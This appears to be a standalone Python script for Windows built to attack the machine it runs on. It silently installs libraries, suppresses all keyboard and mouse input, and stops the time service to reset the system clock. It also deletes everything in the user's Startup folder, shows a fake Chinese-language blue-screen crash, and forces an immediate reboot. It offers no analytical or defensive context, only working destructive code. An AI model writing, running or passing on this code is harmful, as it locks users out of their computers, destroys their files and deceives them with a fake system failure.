import os, sys, ctypes, time, subprocess, threading, shutil
import winreg
try:
  import psutil; import pynput
except:
  subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'psutil', 'pynput']); import psutil; import pynput
def run_cmd(c): subprocess.Popen(c, shell=True, creationflags=0x08000000)
def reg_mod(p, n, v, a):
  try:
    rm={'HKLM':winreg.HKEY_LOCAL_MACHINE,'HKCU':winreg.HKEY_CURRENT_USER}; rk=winreg.HKEY_CURRENT_USER; cp=p
    if '\\' in p: px=p.split('\\')[0].upper(); rk=rm.get(px, rk); cp='\\'.join(p.split('\\')[1:])
    k=winreg.CreateKeyEx(rk, cp, 0, winreg.KEY_SET_VALUE|winreg.KEY_WRITE)
    if a==1: winreg.SetValueEx(k, n, 0, winreg.REG_DWORD, int(v))
    else: winreg.DeleteValue(k, n)
    winreg.CloseKey(k)
  except: pass
kbd_listener = None; mouse_listener = None
def lock_keyboard(block):
  global kbd_listener
  if block:
    if not kbd_listener: kbd_listener = pynput.keyboard.Listener(suppress=True); kbd_listener.start()
  else:
    if kbd_listener: kbd_listener.stop(); kbd_listener = None
def lock_mouse(block):
  global mouse_listener
  if block:
    if not mouse_listener: mouse_listener = pynput.mouse.Listener(suppress=True); mouse_listener.start()
  else:
    if mouse_listener: mouse_listener.stop(); mouse_listener = None
def show_bsod(color, stop, txt, code, act):
  import tkinter as tk
  w = tk.Tk(); w.attributes('-fullscreen', True, '-topmost', True); w.config(bg=color, cursor='none')
  tk.Label(w, text=':(', font=('Segoe UI', 100), bg=color, fg='white').pack(anchor='w', padx=100, pady=(100, 20))
  tk.Label(w, text=txt.replace('\\n', '\n'), font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  pv = tk.StringVar(value='\n0% 完成'); tk.Label(w, textvariable=pv, font=('Microsoft JhengHei', 24), bg=color, fg='white', justify='left').pack(anchor='w', padx=100)
  tk.Label(w, text=f'\n中止代碼: {code}', font=('Microsoft JhengHei', 14), bg=color, fg='white', justify='left').pack(anchor='w', padx=100, pady=40)
  def update(p):
    if p <= stop: pv.set(f'\n{p}% 完成'); w.after(100, update, p + 1)
    else:
      if '關閉' in act: w.destroy()
      else: w.quit()
  w.after(100, update, 0); w.mainloop()
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
lock_keyboard(True)
time.sleep(0.01)
lock_mouse(True)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
run_cmd('net stop w32time'); run_cmd('powershell -Command "Set-Date -Date \'2026-01-01 00:00:00\'"')
time.sleep(0.01)
time.sleep(0.01)
sd = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
if os.path.exists(sd):
  for f in os.listdir(sd):
    tf = os.path.join(sd, f)
    try:
      ctypes.windll.kernel32.SetFileAttributesW(tf, 128)
      if os.path.isfile(tf): os.remove(tf)
      else: shutil.rmtree(tf)
    except: pass
time.sleep(0.01)
time.sleep(0.01)
time.sleep(0.01)
show_bsod('#0078D7', 100, '您的電腦發生問題，必須重新啟動。\n收集錯誤資訊中...', 'CRITICAL_PROCESS_DIED', '藍屏後關閉')
time.sleep(0.01)
run_cmd('shutdown /r /t 0')
time.sleep(0.01)
